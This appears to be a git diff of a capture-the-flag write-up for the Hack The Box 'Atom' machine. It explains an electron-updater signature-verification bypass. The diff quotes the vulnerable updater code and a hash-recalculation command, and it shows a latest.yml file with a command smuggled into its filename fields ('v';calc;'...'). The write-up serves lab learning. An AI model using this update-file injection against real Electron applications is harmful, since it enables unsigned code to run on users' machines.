@@ -20,10 +20,10 @@ output: html_document
 ![desc]({{https://jsom1.github.io/}}/_images/htb_knife_desc.png)
 </div>
 
-**Ports/services exploited:** -\\
+**Ports/services exploited:** SMB\\
 **Tools:** dirb, smbclient\\
-**Techniques:** -\\
-**Keywords:** -\\
+**Techniques:** Enumeration\\
+**Keywords:** Electron builder\\
 
 
 ## 1. Port scanning
@@ -133,9 +133,73 @@ xdg-open UAT_Testing_Procedures.pdf
 ![PDF]({{https://jsom1.github.io/}}/_images/htb_atom_pdf.png)
 </div>
 
-We see on the page that the application was built with *electron-builder*. It is also mentionned that it is a one-tier application. In other words, it's the simplest architecture of a database in which the client, server and database all redise on the same machine. Finally we see the steps of the QA (Quality Assurance) process: build the application and place the updates in one of the "client" folders.
+We see on the page that the application was built with *electron-builder*. It is also mentionned that it is a one-tier application. In other words, it's the simplest architecture of a database in which the client, server and database all redise on the same machine. Finally we see the steps of the QA (Quality Assurance) process: build the application and place the updates in one of the "client" folders.\\
 
-Let's look at what *electron-builder* is. 
+Let's look at what *electron-builder* is. It's an open-source software framework developed and maintained by GitHub. It allows developers to create cross-platform applications with web technologies such as HTML, CSS and Javascript. Some well-known Electron applications include **Atom editor**, Visual Studio Code, and Slack.\\
+So this is why the box is called Atom! We'll search for known vulnerabilities by Googling "electron-builder exploit". The first result mentions a signature validation bypass leading to RCE (https://blog.doyensec.com/2020/02/24/electron-updater-update-signature-bypass.html). That sounds interesting!\\
+
+Apparently, Electon-builder is frequently used for software updates. The auto-update feature is provided by its electron-updater submodule, internally using NSIS for Windows. It features a dual code-signing method for Windows.\\
+The article states there's an overall lack of secure coding practices in the update mechanism. In particular, a vulnerability can be used to bypass the signature verification check, eventually leading to **remote command execution**.\\
+The signature verification check is based on a string comparison between the installed binary's *publisherName* and the certificate's *Common Name* attribute of the update binary. When there's a software update, the application will request a file named *latest.yml* from the update server. This file contains the definition of the new release, including the binary filename and hashes.
+
+The module executes the following code to retrieve the update binary's publisher. It leverages the cmdlet *Get-AuthenticodeSignature* from PowerShell.
+
+````
+    execFile("powershell.exe", ["-NoProfile", "-NonInteractive", "-InputFormat", "None", "-Command", `Get-AuthenticodeSignature '${tempUpdateFile}' | ConvertTo-Json -Compress`], {
+      timeout: 20 * 1000
+    }, (error, stdout, stderr) => {
+      try {
+        if (error != null || stderr) {
+          handleError(logger, error, stderr)
+          resolve(null)
+          return
+        }
+
+        const data = parseOut(stdout)
+        if (data.Status === 0) {
+          const name = parseDn(data.SignerCertificate.Subject).get("CN")!
+          if (publisherNames.includes(name)) {
+            resolve(null)
+            return
+          }
+        }
+
+        const result = `publisherNames: ${publisherNames.join(" | ")}, raw info: ` + JSON.stringify(data, (name, value) => name === "RawData" ? undefined : value, 2)
+        logger.warn(`Sign verification failed, installer signed with incorrect certificate: ${result}`)
+        resolve(result)
+      }
+      catch (e) {
+        logger.warn(`Cannot execute Get-AuthenticodeSignature: ${error}. Ignoring signature validation due to unknown error.`)
+        resolve(null)
+        return
+      }
+    })
+``````
+
+This code translates to the following PowerShell command:
+
+````
+powershell.exe -NoProfile -NonInteractive -InputFormat None -Command "Get-AuthenticodeSignature 'C:\Users\<USER>\AppData\Roaming\<vulnerable app name>\__update__\<update name>.exe' | ConvertTo-Json -Compress"
+`````
+
+The idea is that since the *${tempUpdateFile}* variable is provided unescaped to the *execfile* utility, we can bypass the signature verification by triggering a parse error in the script. It can be done by using a filename containing a sinngle quote and then by recalculating the file hash to match our provided binary (with *shasum -a 512 maliciousupdate.exe | cut -d " " -f1 | xxd -r -p | base64*).\\
+When serving a **latest.yml** file to a vulnerable Electron app, our chosen setup executable will be run without warnings. We could for example leverage the lack of escaping to pull a command injection as follows:
+
+````
+version: 1.2.3
+files:
+  - url: v';calc;'ulnerable-app-setup-1.2.3.exe
+  sha512: GIh9UnKyCaPQ7ccX0MDL10UxPAAZ[...]tkYPEvMxDWgNkb8tPCNZLTbKWcDEOJzfA==
+  size: 44653912
+path: v';calc;'ulnerable-app-1.2.3.exe
+sha512: GIh9UnKyCaPQ7ccX0MDL10UxPAAZr1[...]ZrR5X1kb8tPCNZLTbKWcDEOJzfA==
+releaseDate: '2019-11-20T11:17:02.627Z'
+``````
+
+So from what I understand of the article, we have to write a malicious *latest.yml* file and place it in one of the client folders (we saw that on the PDF). This will automatically initiate the QA process. Therefore, we must find how to write that file.
+
+
+
 
 <ins>**My thoughts**</ins>
 
